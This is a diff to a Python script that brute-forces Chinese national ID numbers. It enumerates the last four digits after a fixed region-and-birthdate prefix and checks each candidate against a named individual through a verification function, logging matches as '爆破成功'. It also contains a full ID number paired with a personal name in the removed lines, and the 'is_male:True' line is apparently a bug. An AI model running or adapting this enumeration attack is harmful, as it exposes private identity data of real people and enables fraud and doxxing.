@@ -88,26 +88,19 @@ def check(sfz,xm):
         print(f"信息正确:{sfz} : {xm}")
         with open("success","a+") as f:
             f.write(f"信息正确:{sfz} : {xm}\n")
-        return True
+        return sfz,xm
     elif result==-1:
         print(f"信息错误:{sfz} : {xm}")
-        return False
-#sfz=input("输入身份证:")        
-#xm=input("输入姓名:")
-xm="王成付"
-sfz="532123198812092811"
-#check("532123198812092811","王成付")
-#if(not check_id(sfz)):
-#    print("初检:身份证格式错误！")
-#else:
-#    check(sfz,xm)
-former="33082120040322"
-lis="0123456789"
+        return False,False
+#-------------------------------------------------------------------
+former="33082120040322"        #区号+生日
+lis="0123456789"               
 o="0123456789X"
-m="13579"
-f="02468"
-xm="刘彦阳"
-is_male:True
+m="13579"#male 男性
+f="02468"#female 女性
+xm="刘彦阳"#姓名
+is_male:True#是否男性
+#-------------------------------------------------------------------
 for i in lis:
     for j in lis:
         if(is_male):
@@ -116,7 +109,8 @@ for i in lis:
                     _all=former+str(i)+str(j)+str(k)+str(l)
                     if(check_id(_all)):
                         result=check(_all,xm)
-                        if(result):
+                        if(result[0]):
+                            print(f"爆破成功: {result[1]} : {result[0]}")
                             break
         else:
             for k in f:
@@ -124,5 +118,6 @@ for i in lis:
                     _all=former+str(i)+str(j)+str(k)+str(l)
                     if(check_id(_all)):
                         result=check(_all,xm)
-                        if(result):
+                        if(result[0]):
+                            print(f"爆破成功: {result[1]} : {result[0]}")
                             break
